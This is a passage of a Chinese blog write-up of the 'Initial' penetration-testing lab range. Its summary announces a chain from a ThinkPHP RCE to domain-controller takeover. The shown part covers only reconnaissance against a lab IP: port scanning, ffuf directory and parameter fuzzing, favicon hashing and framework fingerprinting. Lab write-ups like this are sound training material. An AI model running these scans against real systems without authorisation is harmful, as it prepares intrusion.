@@ -1,0 +1,652 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>春秋云境 Initial 靶场 WP：ThinkPHP RCE → 内网横向 → 域控沦陷 | A Secret Site</title><meta name="author" content="谁把我灯关了"><meta name="copyright" content="谁把我灯关了"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本文为春秋云境「Initial」仿真靶场的完整渗透测试记录。从外网 80 端口入手，利用 ThinkPHP V5.0.23 RCE 漏洞获取 Webshell，通过 sudo 提权拿到 root 权限后上线 MSF；随后借助 Fscan 对 172.22.0.0&#x2F;16 内网段进行扫描，发现域环境及多台主机；利用 MS17-010（永恒之蓝）攻陷域内 Windows 7 主机，通过 DCSync 攻">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境 Initial 靶场 WP：ThinkPHP RCE → 内网横向 → 域控沦陷">
+<meta property="og:url" content="https://beini-faxianl.github.io/2026/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/index.html">
+<meta property="og:site_name" content="A Secret Site">
+<meta property="og:description" content="本文为春秋云境「Initial」仿真靶场的完整渗透测试记录。从外网 80 端口入手，利用 ThinkPHP V5.0.23 RCE 漏洞获取 Webshell，通过 sudo 提权拿到 root 权限后上线 MSF；随后借助 Fscan 对 172.22.0.0&#x2F;16 内网段进行扫描，发现域环境及多台主机；利用 MS17-010（永恒之蓝）攻陷域内 Windows 7 主机，通过 DCSync 攻">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://beini-faxianl.github.io/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/3.jpg">
+<meta property="article:published_time" content="2026-04-09T10:50:00.000Z">
+<meta property="article:modified_time" content="2026-04-09T10:50:00.000Z">
+<meta property="article:author" content="谁把我灯关了">
+<meta property="article:tag" content="Active Directory">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="DCSync">
+<meta property="article:tag" content="Fscan">
+<meta property="article:tag" content="MS17-010">
+<meta property="article:tag" content="MSF">
+<meta property="article:tag" content="Metasploit">
+<meta property="article:tag" content="Mimikatz">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="ThinkPHP">
+<meta property="article:tag" content="Webshell">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="信呼OA">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="域渗透">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="春秋云境">
+<meta property="article:tag" content="横向移动">
+<meta property="article:tag" content="永恒之蓝">
+<meta property="article:tag" content="红队">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://beini-faxianl.github.io/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/3.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "春秋云境 Initial 靶场 WP：ThinkPHP RCE → 内网横向 → 域控沦陷",
+  "url": "https://beini-faxianl.github.io/2026/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/",
+  "image": "https://beini-faxianl.github.io/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/3.jpg",
+  "datePublished": "2026-04-09T10:50:00.000Z",
+  "dateModified": "2026-04-09T10:50:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "谁把我灯关了",
+      "url": "https://beini-faxianl.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://beini-faxianl.github.io/2026/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '春秋云境 Initial 靶场 WP：ThinkPHP RCE → 内网横向 → 域控沦陷',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>@import url("/css/custom.css?v=20260401-2");</style><script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget@0.9.0/autoload.js"></script><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/author.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-coffee"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/3.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">A Secret Site</span></a><a class="nav-page-title" href="/"><span class="site-name">春秋云境 Initial 靶场 WP：ThinkPHP RCE → 内网横向 → 域控沦陷</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-coffee"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">春秋云境 Initial 靶场 WP：ThinkPHP RCE → 内网横向 → 域控沦陷</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-09T10:50:00.000Z" title="发表于 2026-04-09 18:50:00">2026-04-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-09T10:50:00.000Z" title="更新于 2026-04-09 18:50:00">2026-04-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/">内网靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">5.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>25分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="一、靶场介绍-环境信息"><a href="#一、靶场介绍-环境信息" class="headerlink" title="一、靶场介绍 &amp; 环境信息"></a>一、靶场介绍 &amp; 环境信息</h2><p>春秋云境 $\to$ 仿真场景 $\to$ 专业徽章 $\to$ Initial：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260408200532812.png" alt="file-20260408200532812"></p>
+<p>开启场景后，给了一个 IP 地址：</p>
+<ul>
+<li>39.99.151.82</li>
+</ul>
+<p>重要提醒：</p>
+<p>由于我写 WP 并非一次性写完，而靶场一直开着会消耗沙砾（╯︿╰），每次重开靶场给的目标 IP 地址会有区别，请大家见谅。但是，内网地址都是稳定。</p>
+<h2 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h2><p>Rustscan 配合 Nmap 进行 TCP 全端口扫描 + 指纹识别 + 操作系统识别：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> rustscan -a 39.99.151.82 -r 1-65535 -- -sV -O -Pn -n -oA 39.99.151.82_TCP_Ports</span><br></pre></td></tr></table></figure>
+
+<p>结果信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+
+<p>根据端口指纹可以判断对方的操作系统是 Ubuntu。</p>
+<p>补一波 UDP 高价值端口（20个）扫描 + 指纹识别：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sV -sU --top-ports 20 39.99.151.82 -Pn -n -oA 39.99.151.82_UDP_Ports</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<ul>
+<li>所有端口的状态都是“open|filtered”</li>
+</ul>
+<p>目前来看，处理 UDP 端口并不是最高的优先级，等 TCP 端口没有突破再回到 UDP 端口用特定的工具对高价值端口进行精细扫描。</p>
+<p>根据上述信息搜集结果，最优先考虑的就是 80 端口了。</p>
+<h2 id="三、80-端口"><a href="#三、80-端口" class="headerlink" title="三、80 端口"></a>三、80 端口</h2><h3 id="1、假的登入界面"><a href="#1、假的登入界面" class="headerlink" title="1、假的登入界面"></a>1、假的登入界面</h3><p>用浏览器访问：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260408201919151.png" alt="file-20260408201919151"></p>
+<p>是一个登入界面，但是其功能并不完善：</p>
+<ul>
+<li>输入任意账户密码都是跳转到 <code>/login.hrml</code>，而目标上根本没有这个页面</li>
+<li>“注册”功能也是假的，根本点不动</li>
+</ul>
+<p>查看页面源码，看到注释信息中暴露了一个后端端口：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/powers/pow/regUsers&quot;</span><br></pre></td></tr></table></figure>
+
+<p>直接访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://39.99.151.82:8080/powers/pow/regUsers</span><br></pre></td></tr></table></figure>
+
+<p>但是访问不到：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260408202528508.png" alt="file-20260408202528508"></p>
+<p>应该只有内网才能访问这个接口。</p>
+<blockquote>
+<p>直接访问 8080 也是同样的结果。</p>
+</blockquote>
+<h3 id="2、目录爆破"><a href="#2、目录爆破" class="headerlink" title="2、目录爆破"></a>2、目录爆破</h3><p>既然没什么发现，扫一扫目录、爆一爆文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u http://39.99.151.82/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.phtml,.html,.txt,.bak,.old,.swp -ac -recursion -recursion-depth 2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">robots.txt</span><br><span class="line">static</span><br><span class="line">router.php </span><br></pre></td></tr></table></figure>
+
+<p>访问 robots.txt，并没有用的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br></pre></td></tr></table></figure>
+
+<p>static 是一个目录，存在目录遍历漏洞：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260408211334403.png" alt="file-20260408211334403"></p>
+<p>但是没什么有价值的信息。</p>
+<p>router.php 应该是一个后端 API 通过 POST 或者 GET 传输进行路由导航，这个和之前看到的内网 API 信息泄露似乎有所对应，尝试爆破一下参数名，先 GET 传参：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -u <span class="string">&quot;http://39.99.151.82/router.php?FUZZ=test&quot;</span> -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs 0</span><br></pre></td></tr></table></figure>
+
+<p>POST 传参：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -u <span class="string">&quot;http://39.99.151.82/router.php&quot;</span> -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d <span class="string">&quot;FUZZ=test&quot;</span> -H <span class="string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -mc 200 -fs 0</span><br></pre></td></tr></table></figure>
+
+<p>都没有结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">❯ ffuf -u &quot;http://target/router.php&quot; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d &quot;FUZZ=test&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -mc 200 -fs 0</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : POST</span><br><span class="line"> :: URL              : http://target/router.php</span><br><span class="line"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</span><br><span class="line"> :: Header           : Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> :: Data             : FUZZ=test</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200</span><br><span class="line"> :: Filter           : Response size: 0</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">[WARN] Caught keyboard interrupt (Ctrl-C)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                                                                                                                               </span><br><span class="line">❯ ffuf -u &quot;http://39.99.151.82/router.php&quot; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d &quot;FUZZ=test&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -mc 200 -fs 0</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : POST</span><br><span class="line"> :: URL              : http://39.99.151.82/router.php</span><br><span class="line"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</span><br><span class="line"> :: Header           : Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> :: Data             : FUZZ=test</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200</span><br><span class="line"> :: Filter           : Response size: 0</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">:: Progress: [6453/6453] :: Job [1/1] :: 760 req/sec :: Duration: [0:00:11] :: Errors: 0 ::</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、ThinkPHP"><a href="#3、ThinkPHP" class="headerlink" title="3、ThinkPHP"></a>3、ThinkPHP</h3><p>在等扫描结果的时候，我发现这个网站的图标越看越舒徐，会不会用的某种常用框架？</p>
+<p>查找页面源码没看到”ico”的信息，按 F12 $\to$ Network：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260408205547465.png" alt="file-20260408205547465"></p>
+<p>可以发现 <code>favicon.ico</code> 就在根目录下，即“<a target="_blank" rel="noopener" href="http://39.99.151.82/favicon.ico%E2%80%9D%E3%80%82">http://39.99.151.82/favicon.ico”。</a></p>
+<p>用 Python 获取其 mmh3（MurmurHash3）值</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">resp = requests.get(<span class="string">&#x27;http://39.99.151.82/favicon.ico&#x27;</span>)</span><br><span class="line"><span class="built_in">hash</span> = mmh3.<span class="built_in">hash</span>(base64.encodebytes(resp.content))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>)</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1165838194</span><br></pre></td></tr></table></figure>
+
+<p>去数据库（<code>https://wiki.owasp.org/index.php/OWASP_favicon_database</code>）中查找：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260408210029905.png" alt="file-20260408210029905"></p>
+<p>可惜并没有找到结果，换个工具：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">observer_ward -t http://39.99.151.82/favicon.ico</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">observer_ward -t http://39.99.151.82/favicon.ico</span><br><span class="line"> INFO 📇probes loaded: 3183</span><br><span class="line"> INFO 🚀optimized probes: 9</span><br><span class="line"> INFO 🎯target loaded: 1</span><br><span class="line">🎯:[ http://39.99.151.82/favicon.ico [apache-http,thinkphp]  &lt;&gt; &lt;0&gt; (200 OK) ]      </span><br></pre></td></tr></table></figure>
+
+<p>原来是 ThinkPHP，在页面乱输入一通让其报错，看看是否有版本号。</p>
+<p>Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://39.99.151.82/index.php?s=xxx/xxx/xxx</span><br></pre></td></tr></table></figure>
+
